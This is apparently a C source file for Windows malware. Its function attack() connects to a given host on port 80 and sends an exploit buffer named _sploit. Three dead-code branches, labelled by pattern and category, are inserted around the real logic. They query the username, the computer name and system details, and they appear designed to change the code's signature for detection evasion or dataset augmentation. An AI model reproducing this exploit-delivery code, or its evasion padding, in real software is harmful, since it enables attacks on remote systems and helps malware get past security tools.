#include "data_globals.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>   // added for sprintf_s (Category B)

void attack(char *hostname) {
    SOCKET s;
    struct hostent *he;
    SOCKADDR_IN addr;
    int i;

    // --- INSERTED DEAD BRANCH 1 (after declarations, Pattern A, Category A) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        // System info queries (Category A)
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char username[256];
        DWORD userLen = sizeof(username);
        GetUserNameA(username, &userLen);
        char compname[256];
        DWORD compLen = sizeof(compname);
        GetComputerNameA(compname, &compLen);
        volatile int sum = 0;
        for (int k = 0; k < 5; k++) {
            sum += (si.dwNumberOfProcessors + st.wHour) ^ username[k % 10];
        }
        char dummyBuf[64];
        memset(dummyBuf, 0, sizeof(dummyBuf));
        (void)sum;
        (void)compname;
    }

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return;

    he = gethostbyname(hostname);
    if (!he) { closesocket(s); return; }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = *((unsigned long *)he->h_addr_list[0]);
    addr.sin_port = htons(80);

    // --- INSERTED DEAD BRANCH 2 (before connect, Pattern B, Category B) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        // Memory & String operations (Category B)
        size_t len = strlen(hostname) + 16;
        char *buf = (char *)malloc(len);
        if (buf) {
            sprintf_s(buf, len, "TARGET:%s", hostname);
            volatile size_t l = strlen(buf);
            char *copy = (char *)malloc(l + 1);
            if (copy) {
                memcpy(copy, buf, l + 1);
                volatile int cmp = (copy[0] == 'T') ? 1 : 0;
                memset(copy, 0, l + 1);
                free(copy);
            }
            free(buf);
        }
        char dummy[64];
        sprintf_s(dummy, sizeof(dummy), "dead");
        memset(dummy, 0xAA, sizeof(dummy));
    }

    i = connect(s, (struct sockaddr *)&addr, sizeof(addr));
    if (i != 0) { closesocket(s); return; }

    send(s, (const char *)_sploit, sizeof(_sploit), 0);

    // --- INSERTED DEAD BRANCH 3 (after send, Pattern C, Category C) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        // Bitwise/Math loops (Category C)
        volatile unsigned char arr[32];
        for (int j = 0; j < 32; j++) {
            arr[j] = (unsigned char)(j ^ 0x55);
        }
        volatile unsigned int hash = 0x811C9DC5;
        for (int j = 0; j < 32; j++) {
            hash ^= arr[j];
            hash *= 0x01000193;
        }
        volatile unsigned int result = hash;
        for (int k = 0; k < 4; k++) {
            result = (result << 1) ^ (result >> 31);
        }
        char discard[16];
        memset(discard, (char)(result & 0xFF), sizeof(discard));
        (void)result;
    }

    closesocket(s);
}
